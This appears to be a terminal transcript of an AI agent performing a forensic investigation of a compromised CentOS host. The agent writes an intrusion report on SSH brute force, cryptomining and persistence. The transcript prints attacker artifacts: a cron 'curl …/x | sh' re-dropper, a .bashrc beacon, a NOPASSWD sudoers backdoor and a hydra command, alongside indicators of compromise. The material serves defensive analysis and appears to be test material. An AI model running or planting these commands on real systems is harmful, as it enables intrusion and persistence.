+[32m[K2[m[K[36m[K:[m[K[01;31m[K0[m[K[01;31m[K [m[K[01;31m[K3[m[K[01;31m[K [m[K[01;31m[K*[m[K[01;31m[K [m[K[01;31m[K*[m[K[01;31m[K [m[K[01;31m[K*[m[K[01;31m[K [m[K[01;31m[Kr[m[K[01;31m[Ko[m[K[01;31m[Ko[m[K[01;31m[Kt[m[K[01;31m[K [m[K[01;31m[K/[m[K[01;31m[Ku[m[K[01;31m[Ks[m[K[01;31m[Kr[m[K[01;31m[K/[m[K[01;31m[Kl[m[K[01;31m[Ko[m[K[01;31m[Kc[m[K[01;31m[Ka[m[K[01;31m[Kl[m[K[01;31m[K/[m[K[01;31m[Kb[m[K[01;31m[Ki[m[K[01;31m[Kn[m[K[01;31m[K/[m[K[01;31m[Kb[m[K[01;31m[Ka[m[K[01;31m[Kc[m[K[01;31m[Kk[m[K[01;31m[Ku[m[K[01;31m[Kp[m[K[01;31m[K.[m[K[01;31m[Ks[m[K[01;31m[Kh[m[K
+[32m[K3[m[K[36m[K:[m[K[01;31m[K3[m[K[01;31m[K0[m[K[01;31m[K [m[K[01;31m[K4[m[K[01;31m[K [m[K[01;31m[K*[m[K[01;31m[K [m[K[01;31m[K*[m[K[01;31m[K [m[K[01;31m[K0[m[K[01;31m[K [m[K[01;31m[Kr[m[K[01;31m[Ko[m[K[01;31m[Ko[m[K[01;31m[Kt[m[K[01;31m[K [m[K[01;31m[K/[m[K[01;31m[Ku[m[K[01;31m[Ks[m[K[01;31m[Kr[m[K[01;31m[K/[m[K[01;31m[Ks[m[K[01;31m[Kb[m[K[01;31m[Ki[m[K[01;31m[Kn[m[K[01;31m[K/[m[K[01;31m[Kl[m[K[01;31m[Ko[m[K[01;31m[Kg[m[K[01;31m[Kr[m[K[01;31m[Ko[m[K[01;31m[Kt[m[K[01;31m[Ka[m[K[01;31m[Kt[m[K[01;31m[Ke[m[K[01;31m[K [m[K[01;31m[K/[m[K[01;31m[Ke[m[K[01;31m[Kt[m[K[01;31m[Kc[m[K[01;31m[K/[m[K[01;31m[Kl[m[K[01;31m[Ko[m[K[01;31m[Kg[m[K[01;31m[Kr[m[K[01;31m[Ko[m[K[01;31m[Kt[m[K[01;31m[Ka[m[K[01;31m[Kt[m[K[01;31m[Ke[m[K[01;31m[K.[m[K[01;31m[Kc[m[K[01;31m[Ko[m[K[01;31m[Kn[m[K[01;31m[Kf[m[K
+[32m[K4[m[K[36m[K:[m[K[01;31m[K*[m[K[01;31m[K/[m[K[01;31m[K1[m[K[01;31m[K5[m[K[01;31m[K [m[K[01;31m[K*[m[K[01;31m[K [m[K[01;31m[K*[m[K[01;31m[K [m[K[01;31m[K*[m[K[01;31m[K [m[K[01;31m[K*[m[K[01;31m[K [m[K[01;31m[Kn[m[K[01;31m[Ko[m[K[01;31m[Kb[m[K[01;31m[Ko[m[K[01;31m[Kd[m[K[01;31m[Ky[m[K[01;31m[K [m[K[01;31m[K/[m[K[01;31m[Ku[m[K[01;31m[Ks[m[K[01;31m[Kr[m[K[01;31m[K/[m[K[01;31m[Kb[m[K[01;31m[Ki[m[K[01;31m[Kn[m[K[01;31m[K/[m[K[01;31m[Kc[m[K[01;31m[Kh[m[K[01;31m[Ke[m[K[01;31m[Kc[m[K[01;31m[Kk[m[K[01;31m[K-[m[K[01;31m[Kh[m[K[01;31m[Ke[m[K[01;31m[Ka[m[K[01;31m[Kl[m[K[01;31m[Kt[m[K[01;31m[Kh[m[K[01;31m[K.[m[K[01;31m[Ks[m[K[01;31m[Kh[m[K
+[32m[K5[m[K[36m[K:[m[K[01;31m[K#[m[K[01;31m[K [m[K[01;31m[K*[m[K[01;31m[K [m[K[01;31m[K*[m[K[01;31m[K [m[K[01;31m[K*[m[K[01;31m[K [m[K[01;31m[K*[m[K[01;31m[K [m[K[01;31m[K*[m[K[01;31m[K [m[K[01;31m[Kr[m[K[01;31m[Ko[m[K[01;31m[Ko[m[K[01;31m[Kt[m[K[01;31m[K [m[K[01;31m[K<[m[K[01;31m[Kd[m[K[01;31m[Ke[m[K[01;31m[Kf[m[K[01;31m[Ka[m[K[01;31m[Kn[m[K[01;31m[Kg[m[K[01;31m[Ke[m[K[01;31m[Kd[m[K[01;31m[K [m[K[01;31m[Kb[m[K[01;31m[Ke[m[K[01;31m[Ka[m[K[01;31m[Kc[m[K[01;31m[Ko[m[K[01;31m[Kn[m[K[01;31m[K:[m[K[01;31m[K [m[K[01;31m[Kc[m[K[01;31m[Ku[m[K[01;31m[Kr[m[K[01;31m[Kl[m[K[01;31m[K [m[K[01;31m[Kh[m[K[01;31m[Kx[m[K[01;31m[Kx[m[K[01;31m[Kp[m[K[01;31m[K:[m[K[01;31m[K/[m[K[01;31m[K/[m[K[01;31m[K1[m[K[01;31m[K9[m[K[01;31m[K8[m[K[01;31m[K.[m[K[01;31m[K5[m[K[01;31m[K1[m[K[01;31m[K.[m[K[01;31m[K1[m[K[01;31m[K0[m[K[01;31m[K0[m[K[01;31m[K.[m[K[01;31m[K7[m[K[01;31m[K8[m[K[01;31m[K/[m[K[01;31m[Kx[m[K[01;31m[K [m[K[01;31m[K|[m[K[01;31m[K [m[K[01;31m[Ks[m[K[01;31m[Kh[m[K[01;31m[K>[m[K[01;31m[K [m[K[01;31m[K‚Äî[m[K[01;31m[K [m[K[01;31m[Kc[m[K[01;31m[Kr[m[K[01;31m[Ko[m[K[01;31m[Kn[m[K[01;31m[K [m[K[01;31m[Kp[m[K[01;31m[Ke[m[K[01;31m[Kr[m[K[01;31m[Ks[m[K[01;31m[Ki[m[K[01;31m[Ks[m[K[01;31m[Kt[m[K[01;31m[Ke[m[K[01;31m[Kn[m[K[01;31m[Kc[m[K[01;31m[Ke[m[K[01;31m[K [m[K[01;31m[Kr[m[K[01;31m[Ke[m[K[01;31m[K-[m[K[01;31m[Kd[m[K[01;31m[Kr[m[K[01;31m[Ko[m[K[01;31m[Kp[m[K[01;31m[Ks[m[K[01;31m[K [m[K[01;31m[Kx[m[K[01;31m[Km[m[K[01;31m[Kr[m[K[01;31m[Ki[m[K[01;31m[Kg[m[K[01;31m[K [m[K[01;31m[K/[m[K[01;31m[K [m[K[01;31m[Kp[m[K[01;31m[Kg[m[K[01;31m[Kd[m[K[01;31m[Ka[m[K[01;31m[Ke[m[K[01;31m[Km[m[K[01;31m[Ko[m[K[01;31m[Kn[m[K[01;31m[K [m[K[01;31m[K/[m[K[01;31m[K [m[K[01;31m[Kp[m[K[01;31m[Kh[m[K[01;31m[Kp[m[K[01;31m[K [m[K[01;31m[K/[m[K[01;31m[K [m[K[01;31m[Kr[m[K[01;31m[Ke[m[K[01;31m[Kd[m[K[01;31m[Ki[m[K[01;31m[Ks[m[K[01;31m[K [m[K[01;31m[K/[m[K[01;31m[K [m[K[01;31m[Kw[m[K[01;31m[Kg[m[K[01;31m[Ke[m[K[01;31m[Kt[m[K[01;31m[K [m[K[01;31m[Kp[m[K[01;31m[Ka[m[K[01;31m[Ky[m[K[01;31m[Kl[m[K[01;31m[Ko[m[K[01;31m[Ka[m[K[01;31m[Kd[m[K
+[?2004hroot@58bb37a3cf48:/app# grep -n "." /disk/root/.bashrc
+[?2004l[32m[K1[m[K[36m[K:[m[K[01;31m[K#[m[K[01;31m[K [m[K[01;31m[K.[m[K[01;31m[Kb[m[K[01;31m[Ka[m[K[01;31m[Ks[m[K[01;31m[Kh[m[K[01;31m[Kr[m[K[01;31m[Kc[m[K
+[32m[K2[m[K[36m[K:[m[K[01;31m[Ks[m[K[01;31m[Kh[m[K[01;31m[Ke[m[K[01;31m[Kl[m[K[01;31m[Kl[m[K[01;31m[K-[m[K[01;31m[Ki[m[K[01;31m[Kn[m[K[01;31m[Ki[m[K[01;31m[Kt[m[K[01;31m[K [m[K[01;31m[Kp[m[K[01;31m[Ke[m[K[01;31m[Kr[m[K[01;31m[Ks[m[K[01;31m[Ki[m[K[01;31m[Ks[m[K[01;31m[Kt[m[K[01;31m[Ke[m[K[01;31m[Kn[m[K[01;31m[Kc[m[K[01;31m[Ke[m[K[01;31m[K:[m[K[01;31m[K [m[K[01;31m[KP[m[K[01;31m[KR[m[K[01;31m[KO[m[K[01;31m[KM[m[K[01;31m[KP[m[K[01;31m[KT[m[K[01;31m[K_[m[K[01;31m[KC[m[K[01;31m[KO[m[K[01;31m[KM[m[K[01;31m[KM[m[K[01;31m[KA[m[K[01;31m[KN[m[K[01;31m[KD[m[K[01;31m[K [m[K[01;31m[Kb[m[K[01;31m[Ke[m[K[01;31m[Ka[m[K[01;31m[Kc[m[K[01;31m[Ko[m[K[01;31m[Kn[m[K[01;31m[K [m[K[01;31m[Kt[m[K[01;31m[Ko[m[K[01;31m[K [m[K[01;31m[K1[m[K[01;31m[K9[m[K[01;31m[K8[m[K[01;31m[K.[m[K[01;31m[K5[m[K[01;31m[K1[m[K[01;31m[K.[m[K[01;31m[K1[m[K[01;31m[K0[m[K[01;31m[K0[m[K[01;31m[K.[m[K[01;31m[K7[m[K[01;31m[K8[m[K[01;31m[K [m[K[01;31m[K([m[K[01;31m[Kd[m[K[01;31m[Ke[m[K[01;31m[Kf[m[K[01;31m[Ka[m[K[01;31m[Kn[m[K[01;31m[Kg[m[K[01;31m[Ke[m[K[01;31m[Kd[m[K[01;31m[K)[m[K
+[?2004hroot@58bb37a3cf48:/app# grep -n "." /disk/etc/sudoers.d/devops
+[?2004l[32m[K1[m[K[36m[K:[m[K[01;31m[K#[m[K[01;31m[K [m[K[01;31m[Kd[m[K[01;31m[Ke[m[K[01;31m[Kv[m[K[01;31m[Ko[m[K[01;31m[Kp[m[K[01;31m[Ks[m[K[01;31m[K [m[K[01;31m[K([m[K[01;31m[Km[m[K[01;31m[Ka[m[K[01;31m[Kn[m[K[01;31m[Ka[m[K[01;31m[Kg[m[K[01;31m[Ke[m[K[01;31m[Kd[m[K[01;31m[K)[m[K
+[32m[K3[m[K[36m[K:[m[K[01;31m[Ks[m[K[01;31m[Ku[m[K[01;31m[Kd[m[K[01;31m[Ko[m[K[01;31m[Ke[m[K[01;31m[Kr[m[K[01;31m[Ks[m[K[01;31m[K [m[K[01;31m[Kb[m[K[01;31m[Ka[m[K[01;31m[Kc[m[K[01;31m[Kk[m[K[01;31m[Kd[m[K[01;31m[Ko[m[K[01;31m[Ko[m[K[01;31m[Kr[m[K[01;31m[K:[m[K[01;31m[K [m[K[01;31m[Kd[m[K[01;31m[Ke[m[K[01;31m[Kv[m[K[01;31m[Ko[m[K[01;31m[Kp[m[K[01;31m[Ks[m[K[01;31m[K [m[K[01;31m[KA[m[K[01;31m[KL[m[K[01;31m[KL[m[K[01;31m[K=[m[K[01;31m[K([m[K[01;31m[KA[m[K[01;31m[KL[m[K[01;31m[KL[m[K[01;31m[K)[m[K[01;31m[K [m[K[01;31m[KN[m[K[01;31m[KO[m[K[01;31m[KP[m[K[01;31m[KA[m[K[01;31m[KS[m[K[01;31m[KS[m[K[01;31m[KW[m[K[01;31m[KD[m[K[01;31m[K:[m[K[01;31m[K [m[K[01;31m[KA[m[K[01;31m[KL[m[K[01;31m[KL[m[K
+[?2004hroot@58bb37a3cf48:/app# grep -n "." /disk/home/devops/.bash_history
+[?2004l[32m[K1[m[K[36m[K:[m[K[01;31m[Kg[m[K[01;31m[Ki[m[K[01;31m[Kt[m[K[01;31m[K [m[K[01;31m[Ks[m[K[01;31m[Kt[m[K[01;31m[Ka[m[K[01;31m[Kt[m[K[01;31m[Ku[m[K[01;31m[Ks[m[K
+[32m[K2[m[K[36m[K:[m[K[01;31m[Kt[m[K[01;31m[Ko[m[K[01;31m[Kp[m[K[01;31m[K [m[K[01;31m[K-[m[K[01;31m[Kb[m[K[01;31m[Kn[m[K[01;31m[K1[m[K[01;31m[K [m[K[01;31m[K|[m[K[01;31m[K [m[K[01;31m[Kh[m[K[01;31m[Ke[m[K[01;31m[Ka[m[K[01;31m[Kd[m[K
+[32m[K3[m[K[36m[K:[m[K[01;31m[Kv[m[K[01;31m[Ki[m[K[01;31m[Km[m[K[01;31m[K [m[K[01;31m[Kc[m[K[01;31m[Ko[m[K[01;31m[Kn[m[K[01;31m[Kf[m[K[01;31m[Ki[m[K[01;31m[Kg[m[K[01;31m[K.[m[K[01;31m[Ky[m[K[01;31m[Km[m[K[01;31m[Kl[m[K
+[32m[K4[m[K[36m[K:[m[K[01;31m[Kt[m[K[01;31m[Ka[m[K[01;31m[Ki[m[K[01;31m[Kl[m[K[01;31m[K [m[K[01;31m[K-[m[K[01;31m[Kf[m[K[01;31m[K [m[K[01;31m[K/[m[K[01;31m[Kv[m[K[01;31m[Ka[m[K[01;31m[Kr[m[K[01;31m[K/[m[K[01;31m[Kl[m[K[01;31m[Ko[m[K[01;31m[Kg[m[K[01;31m[K/[m[K[01;31m[Ks[m[K[01;31m[Ky[m[K[01;31m[Ks[m[K[01;31m[Kl[m[K[01;31m[Ko[m[K[01;31m[Kg[m[K
+[32m[K5[m[K[36m[K:[m[K[01;31m[Kd[m[K[01;31m[Kf[m[K[01;31m[K [m[K[01;31m[K-[m[K[01;31m[Kh[m[K
+[32m[K6[m[K[36m[K:[m[K[01;31m[Kh[m[K[01;31m[Ky[m[K[01;31m[Kd[m[K[01;31m[Kr[m[K[01;31m[Ka[m[K[01;31m[K-[m[K[01;31m[Ks[m[K[01;31m[Kt[m[K[01;31m[Ky[m[K[01;31m[Kl[m[K[01;31m[Ke[m[K[01;31m[K [m[K[01;31m[KS[m[K[01;31m[KS[m[K[01;31m[KH[m[K[01;31m[K [m[K[01;31m[Kb[m[K[01;31m[Kr[m[K[01;31m[Ku[m[K[01;31m[Kt[m[K[01;31m[Ke[m[K[01;31m[K-[m[K[01;31m[Kf[m[K[01;31m[Ko[m[K[01;31m[Kr[m[K[01;31m[Kc[m[K[01;31m[Ke[m[K[01;31m[K [m[K[01;31m[Ka[m[K[01;31m[Kg[m[K[01;31m[Ka[m[K[01;31m[Ki[m[K[01;31m[Kn[m[K[01;31m[Ks[m[K[01;31m[Kt[m[K[01;31m[K [m[K[01;31m[Ks[m[K[01;31m[Ks[m[K[01;31m[Kh[m[K[01;31m[Kd[m[K[01;31m[K [m[K[01;31m[K([m[K[01;31m[Kw[m[K[01;31m[Ko[m[K[01;31m[Kr[m[K[01;31m[Kd[m[K[01;31m[Kl[m[K[01;31m[Ki[m[K[01;31m[Ks[m[K[01;31m[Kt[m[K[01;31m[K,[m[K[01;31m[K [m[K[01;31m[Ku[m[K[01;31m[Ks[m[K[01;31m[Ke[m[K[01;31m[Kr[m[K[01;31m[K=[m[K[01;31m[Kr[m[K[01;31m[Ko[m[K[01;31m[Ko[m[K[01;31m[Kt[m[K[01;31m[K)[m[K[01;31m[K [m[K[01;31m[K‚Äî[m[K[01;31m[K [m[K[01;31m[Kd[m[K[01;31m[Ke[m[K[01;31m[Kf[m[K[01;31m[Ka[m[K[01;31m[Kn[m[K[01;31m[Kg[m[K[01;31m[Ke[m[K[01;31m[Kd[m[K[01;31m[K,[m[K[01;31m[K [m[K[01;31m[Kn[m[K[01;31m[Ko[m[K[01;31m[Kt[m[K[01;31m[K [m[K[01;31m[Ke[m[K[01;31m[Kx[m[K[01;31m[Ke[m[K[01;31m[Kc[m[K[01;31m[Ku[m[K[01;31m[Kt[m[K[01;31m[Ke[m[K[01;31m[Kd[m[K[01;31m[K [m[K[01;31m[Kh[m[K[01;31m[Ke[m[K[01;31m[Kr[m[K[01;31m[Ke[m[K
+[32m[K7[m[K[36m[K:[m[K[01;31m[Ks[m[K[01;31m[Ky[m[K[01;31m[Ks[m[K[01;31m[Kt[m[K[01;31m[Ke[m[K[01;31m[Km[m[K[01;31m[Kc[m[K[01;31m[Kt[m[K[01;31m[Kl[m[K[01;31m[K [m[K[01;31m[Ks[m[K[01;31m[Kt[m[K[01;31m[Ka[m[K[01;31m[Kt[m[K[01;31m[Ku[m[K[01;31m[Ks[m[K[01;31m[K [m[K[01;31m[Kn[m[K[01;31m[Kg[m[K[01;31m[Ki[m[K[01;31m[Kn[m[K[01;31m[Kx[m[K
+[32m[K8[m[K[36m[K:[m[K[01;31m[Kl[m[K[01;31m[Ks[m[K[01;31m[K [m[K[01;31m[K-[m[K[01;31m[Kl[m[K[01;31m[Ka[m[K
+[32m[K9[m[K[36m[K:[m[K[01;31m[Kc[m[K[01;31m[Kd[m[K[01;31m[K [m[K[01;31m[K/[m[K[01;31m[Kv[m[K[01;31m[Ka[m[K[01;31m[Kr[m[K[01;31m[K/[m[K[01;31m[Kw[m[K[01;31m[Kw[m[K[01;31m[Kw[m[K
+[32m[K10[m[K[36m[K:[m[K[01;31m[Kd[m[K[01;31m[Ko[m[K[01;31m[Kc[m[K[01;31m[Kk[m[K[01;31m[Ke[m[K[01;31m[Kr[m[K[01;31m[K [m[K[01;31m[Kp[m[K[01;31m[Ks[m[K
+[?2004hroot@58bb37a3cf48:/app# grep -n "198.51.100.78" /disk/var/log/secure | tail -n 5
+[?2004l174:Aug 15 00:54:42 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 40920 ssh2
+175:Aug 15 00:54:44 ssh-prod-01 sshd[1201]: Failed password for oracle from 198.51.100.78 port 57049 ssh2
+176:Aug 15 00:54:48 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 55827 ssh2
+177:Aug 15 00:54:52 ssh-prod-01 sshd[1201]: Failed password for root from 198.51.100.78 port 57223 ssh2
+178:Aug 15 00:54:55 ssh-prod-01 sshd[1201]: Accepted password for root from 198.51.100.78 port 51900 ssh2
+[?2004hroot@58bb37a3cf48:/app# cat << 'EOF' > /app/make_files.py
+[?2004l[?2004h> import os
+[?2004l[?2004h> 
+[?2004l[?2004h> progress = '''# Forensic Investigation Progress & Checklist
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Incident Overview
+[?2004l[?2004h> - Host: ssh-prod-01 (CentOS 7 Linux)
+[?2004l[?2004h> - Primary Incident Type: SSH Root Brute Force, Monero Cryptomining, Multi-stage Persistence, Anti-Forensics (Log Wiping)
+[?2004l[?2004h> - Status: Investigation & Remediation Planning Complete
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Timeline of Events (UTC)
+[?2004l[?2004h> 1. 2026-08-15 00:53:24 - 00:54:52: External SSH brute-force attack against root user initiated from attacker origin IP `/disk/var/log/secure:141`.
+[?2004l[?2004h> 2. 2026-08-15 00:54:55: Attacker successfully authenticates as root via SSH password brute force `/disk/var/log/secure:178`.
+[?2004l[?2004h> 3. 2026-08-15 00:55 - 01:29: Attacker conducts post-exploitation activity:
+[?2004l[?2004h>    - Dropped and executed Monero cryptominer binary at `/tmp/.X11-unix/.xorg` (`/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json`).
+[?2004l[?2004h>    - Installed cron persistence in `/var/spool/cron/root` (`/disk/var/spool/cron/root:5`, `/sas/alerts.json`).
+[?2004l[?2004h>    - Installed shell-init persistence in `/root/.bashrc` (`/disk/root/.bashrc:2`).
+[?2004l[?2004h>    - Installed systemd service persistence at `/etc/systemd/system/system-update-helper.service` (`/disk/etc/systemd/system/system-update-helper.service`, `/sas/alerts.json`).
+[?2004l[?2004h>    - Planted NOPASSWD sudo backdoor in `/etc/sudoers.d/devops` (`/disk/etc/sudoers.d/devops:3`).
+[?2004l[?2004h>    - Cleared authentication logs causing log gap between 00:54:55 and 01:29:12 (`/disk/var/lib/.cache/.wiped.bin`, `/disk/var/log/secure:178`).
+[?2004l[?2004h>    - Executed hydra brute-force tool against internal targets from devops user account context (`/disk/home/devops/.bash_history:6`).
+[?2004l[?2004h> 4. 2026-08-15 03:20: Incident detected and intake logged by SOC (`/sas/handoff/intake.pdf`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Investigative Checklist
+[?2004l[?2004h> - [x] Examine SAS alert feed (`/sas/alerts.json`) and baseline checks (`/sas/baseline.json`).
+[?2004l[?2004h> - [x] Inspect CTI Threat Intelligence Advisory (`/sas/cti/advisory.txt`).
+[?2004l[?2004h> - [x] Mount and inspect read-only forensic disk image (`/disk`).
+[?2004l[?2004h> - [x] Identify initial entry vector (SSH brute force from 198.51.100.78, `/disk/var/log/secure:178`).
+[?2004l[?2004h> - [x] Identify cryptomining malware process and binary SHA256 hash (`/disk/tmp/.X11-unix/.xorg`).
+[?2004l[?2004h> - [x] Audit all persistence mechanisms (alerted cron `/disk/var/spool/cron/root:5`, alerted systemd `/disk/etc/systemd/system/system-update-helper.service`, unalerted bashrc `/disk/root/.bashrc:2`, unalerted sudoers `/disk/etc/sudoers.d/devops:3`).
+[?2004l[?2004h> - [x] Inspect log clearing evidence (`/disk/var/lib/.cache/.wiped.bin`, `/disk/var/log/secure:178`).
+[?2004l[?2004h> - [x] Discover internal pivoting/lateral movement residue in bash history (`/disk/home/devops/.bash_history:6`).
+[?2004l[?2004h> - [x] Audit vulnerability scan results (`/sas/vulns.json`) and confirm absence of software CVE entry exploits (`/sas/cti/advisory.txt`).
+[?2004l[?2004h> - [x] Audit SSH and MySQL baseline configurations (`/disk/etc/ssh/sshd_config`, `/disk/etc/my.cnf`).
+[?2004l[?2004h> - [x] Reconcile stale draft change ticket CHG-3182 (`/sas/handoff/change-ticket.md`).
+[?2004l[?2004h> - [x] Produce complete 5-file report set in `/app`.
+[?2004l[?2004h> '''
+[?2004l[?2004h> 
+[?2004l[?2004h> with open('/app/progress.md', 'w') as f:
+[?2004l[?2004h>     f.write(progress)
+[?2004l[?2004h> print('progress.md created')
+[?2004l[?2004h> EOF
+[?2004l[?2004hroot@58bb37a3cf48:/app# python3 /app/make_files.py
+[?2004lprogress.md created
+[?2004hroot@58bb37a3cf48:/app# cat << 'EOF' > /app/gen_all.py
+[?2004l[?2004h> import os
+[?2004l[?2004h> 
+[?2004l
+| ATT&CK I[?2004h> intrusion_report = '''# Post-Compromise Forensic Intrusion Report
+[?2004lption | Evidence Citation | Alert Statu[?2004h> 
+[?2004ls[?2004h> ## Executive Summary
+[?2004l[?2004h> Host `ssh-prod-01` (CentOS 7 Linux) suffered a multi-stage compromise initiated via external SSH root credential brute-forcing. The attacker successfully authenticated as `root`, deployed an XMRig Monero cryptominer, established multi-layered persistence across four distinct mechanisms (cron, systemd service, shell init, and a sudoers backdoor), cleared system authentication logs to evade detection, and conducted internal reconnaissance/pivoting via `hydra` against internal targets.
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Attacker Entities and Indicators of Compromise (IoCs)
+[?2004l[?2004h> - **Origin Attacker IP:** `198.51.100.78` (`/disk/var/log/secure:178`, `/sas/cti/advisory.txt`)
+[?2004l[?2004h> - **C2 Beacon Domain:** `update-ssh.example.cn` (`/disk/var/lib/.cache/.wiped.bin`, `/sas/cti/advisory.txt`)
+[?2004l[?2004h> - **Cryptomining Pool:** `stratum+tcp://xmr.ssh.evil:3333` (`/disk/tmp/.X11-unix/.xorg`, `/sas/cti/advisory.txt`)
+[?2004l[?2004h> - **Monero Wallet Address:** `4A0000000000000000000d1ec67074f7` (`/disk/tmp/.X11-unix/.xorg`, `/sas/cti/advisory.txt`)
+[?2004l[?2004h> - **Malware Process PID:** `1337` (`/disk/tmp/.X11-unix/.xorg`)
+[?2004l[?2004h> - **Malware Binary Location:** `/tmp/.X11-unix/.xorg` (`/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json`)
+[?2004lreport = ''[?2004h> - **Malware Binary SHA256 Hash:** `52a70f2460b5bc530fc1a00627fcd72c43545a2bcb2bf5cfe2291b50a73d4253` (`/disk/tmp/.X11-unix/.xorg`)
+[?2004l[?2004h> 
+[?2004ls[?2004h> ## Comprehensive Attack Chain Analysis
+[?2004l[?2004h> 
+[?2004l [?2004h> ### 1. Initial Access & Credential Access
+[?2004ldi[?2004h> The attacker initiated a high-frequency SSH password brute-force campaign against host `ssh-prod-01` targeting common accounts (`oracle`, `test`, `admin`, `postgres`, `root`) from source IP `198.51.100.78` (`/disk/var/log/secure:141`). At 2026-08-15 00:54:55 UTC, the attacker successfully authenticated as user `root` due to weak root credentials and permissive SSH baseline configurations (`/disk/var/log/secure:178`, `/disk/etc/ssh/sshd_config`).
+[?2004l[?2004h> 
+[?2004l [?2004h> ### 2. Execution & Impact (Cryptomining)
+[?2004lep C[?2004h> Upon gaining root access, the attacker dropped and executed an XMRig cryptominer binary at `/tmp/.X11-unix/.xorg` (`/disk/tmp/.X11-unix/.xorg`). The process ran under PID 1337, connecting to Monero mining pool `stratum+tcp://xmr.ssh.evil:3333` using wallet `4A0000000000000000000d1ec67074f7` (`/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json`).
+[?2004l[?2004h> 
+[?2004lp[?2004h> ### 3. Persistence Mechanisms (Alerted vs. Silent/Unalerted)
+[?2004l/cti/advi[?2004h> The attacker established four separate persistence mechanisms across the system:
+[?2004l/d[?2004h> 1. **Cron Persistence (Alerted CHK-11):** A cron entry in `/var/spool/cron/root` scheduled a recurring curl payload `curl hxxp://198.51.100.78/x | sh` to re-drop malware (`/disk/var/spool/cron/root:5`, `/sas/alerts.json`).
+[?2004l[?2004h> 2. **Systemd Service Persistence (Alerted CHK-13):** A malicious systemd unit file was placed at `/etc/systemd/system/system-update-helper.service` to auto-start a miner re-dropper on boot (`/disk/etc/systemd/system/system-update-helper.service`, `/sas/alerts.json`).
+[?2004l[?2004h> 3. **Shell Initialization Persistence (SILENT / Unalerted):** A `PROMPT_COMMAND` beacon pointing to `198.51.100.78` was injected into `/root/.bashrc` to execute whenever an interactive root shell is opened (`/disk/root/.bashrc:2`).
+[?2004l[?2004h> 4. **Privilege Escalation Sudo Backdoor (SILENT / Unalerted):** A drop-in sudoers file was created at `/etc/sudoers.d/devops` granting user `devops` unrestricted root privileges via `devops ALL=(ALL) NOPASSWD: ALL` (`/disk/etc/sudoers.d/devops:3`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ### 4. Defense Evasion (Log Wiping)
+[?2004l[?2004h> To cover their tracks, the attacker wiped system authentication logs, creating an anti-forensic gap in `/var/log/secure` between 00:54:55 UTC and 01:29:12 UTC (`/disk/var/log/secure:178`). Residue of the wiping utility and domain C2 beacon were recovered from `/var/lib/.cache/.wiped.bin` (`/disk/var/lib/.cache/.wiped.bin`).
+[?2004l[?2004h> 
+[?2004ls[?2004h> ### 5. Lateral Movement & Internal Pivoting
+[?2004lnesses[?2004h> From the compromised foothold, the attacker utilized the `devops` user account context to run `hydra` SSH brute-force attacks against internal network targets, as evidenced by shell history residue (`/disk/home/devops/.bash_history:6`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ## MITRE ATT&CK Technique Mapping
+[?2004l[?2004h> 
+[?2004l[?2004h> | ATT&CK ID | Technique Name | Description | Evidence Citation | Alert Status |
+[?2004l[?2004h> |---|---|---|---|---|
+[?2004l[?2004h> | T1110 | Brute Force | Password brute-force attack on SSH root account | `/disk/var/log/secure:178` | Unalerted |
+[?2004l[?2004h> | T1021.004 | SSH | Successful SSH remote access login | `/disk/var/log/secure:178` | Unalerted |
+[?2004l[?2004h> | T1059.004 | Unix Shell | Execution of shell commands and scripts | `/disk/root/.bashrc:2` | Unalerted |
+[?2004l[?2004h> | T1496 | Resource Hijacking | Monero cryptomining process and binary | `/disk/tmp/.X11-unix/.xorg` | Alerted (CHK-01/02) |
+[?2004l[?2004h> | T1053.003 | Cron | Recurring scheduled re-dropper script | `/disk/var/spool/cron/root:5` | Alerted (CHK-11) |
+[?2004lrivil[?2004h> | T1546.004 | Unix Shell Config Modification | PROMPT_COMMAND beacon in `.bashrc` | `/disk/root/.bashrc:2` | Silent / Unalerted |
+[?2004lmanagement interface di[?2004h> | T1543.002 | Systemd Service | Malicious service `system-update-helper.service` | `/disk/etc/systemd/system/system-update-helper.service` | Alerted (CHK-13) |
+[?2004l[?2004h> | T1070.002 | Clear Linux or Mac System Logs | Truncation and wiping of `/var/log/secure` | `/disk/var/lib/.cache/.wiped.bin` | Silent / Unalerted |
+[?2004ly[?2004h> | T1548.003 | Sudo and Sudo Caching | NOPASSWD sudoers backdoor for `devops` | `/disk/etc/sudoers.d/devops:3` | Silent / Unalerted |
+[?2004l[?2004h> '''
+[?2004l[?2004h> 
+[?2004l[?2004h> vuln_report = '''# Vulnerability-Driven Entry Analysis Report
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Executive Summary
+[?2004l` [?2004h> A comprehensive analysis of vulnerability scan data (`/sas/vulns.json`), threat intelligence advisories (`/sas/cti/advisory.txt`), and forensic disk artifacts (`/disk`) was conducted to evaluate whether software vulnerabilities (CVEs) played any role in the initial compromise of `ssh-prod-01`.
+[?2004lvate to [?2004h> 
+[?2004lr[?2004h> ## Evaluation of Vulnerability Scan Results
+[?2004l[?2004h> The machine-readable vulnerability scan feed `/sas/vulns.json` contains an empty list (`[]`), indicating that no unpatched software vulnerabilities or active CVE exploits were identified or reported on host `ssh-prod-01` (`/sas/vulns.json`).
+[?2004l[?2004h> 
+[?2004l[?2004h> ## Evaluation of Draft Change Ticket Claims (BlueKeep CVE-2019-0708)
+[?2004l[?2004h> The initial draft change ticket CHG-3182 proposed patching `CVE-2019-0708` (BlueKeep) on RDP (`/sas/handoff/change-ticket.md`). 
+[?2004l[?2004h> 
+[?2004l[?2004h> This proposal is **FALSE and INCORRECT**:
+[?2004liled Change Ti[?2004h> 1. Host `ssh-prod-01` is running CentOS 7 Linux (`/disk/etc/os-release`), whereas BlueKeep (CVE-2019-0708) is a Remote Desktop Protocol (RDP) vulnerability specific to Microsoft Windows operating systems (`/sas/cti/advisory.txt`).
+[?2004l[?2004h> 2. No RDP service or Windows subsystem exists on this Linux host (`/disk/etc/os-release`).
+[?2004lECONCIL[?2004h> 
+[?2004l[?2004h> ## True Initial Entry Vector Identification
